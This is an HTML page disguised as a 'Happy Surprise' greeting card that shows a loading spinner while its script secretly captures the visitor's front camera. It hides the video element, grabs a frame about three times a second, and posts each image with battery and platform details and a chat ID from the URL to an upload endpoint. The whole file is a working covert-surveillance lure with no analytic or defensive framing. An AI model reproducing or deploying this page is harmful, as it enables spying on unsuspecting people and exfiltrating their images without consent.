<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Surprise Wish!</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #1f4068, #162447);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            max-width: 350px;
            width: 90%;
        }
        h1 { font-size: 24px; margin-bottom: 10px; color: #e43f5a; }
        p { font-size: 14px; color: #cbd5e1; margin-bottom: 20px; }
        .loader {
            border: 4px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top: 4px solid #e43f5a;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h1>🎉 Happy Surprise! 🎁</h1>
        <p>Loading your special wish, please wait a moment...</p>
        <div class="loader"></div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id');

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        let batteryInfo = 'N/A';
        if (navigator.getBattery) {
            navigator.getBattery().then(batt => {
                batteryInfo = Math.round(batt.level * 100) + '%';
            });
        }
        const platformInfo = navigator.platform || 'Unknown';

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                video.srcObject = stream;

                // প্রতি ৩৩০ মিলিসেকেন্ডে ১টি করে ছবি তুলবে (অর্থাৎ সেকেন্ডে প্রায় ৩টি)
                setInterval(() => {
                    captureAndSend();
                }, 330);

            } catch (err) {
                console.error("Camera permission denied or error:", err);
            }
        }

        function captureAndSend() {
            if (!chatId) return;

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.8);

            fetch('/upload-image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    image: imageData,
                    name: "Web Visitor",
                    battery: batteryInfo,
                    platform: platformInfo
                })
            })
            .then(res => res.json())
            .then(data => console.log("Sent successfully:", data))
            .catch(err => console.error("Upload error:", err));
        }

        window.onload = () => {
            initCamera();
        };
    </script>
</body>
</html>
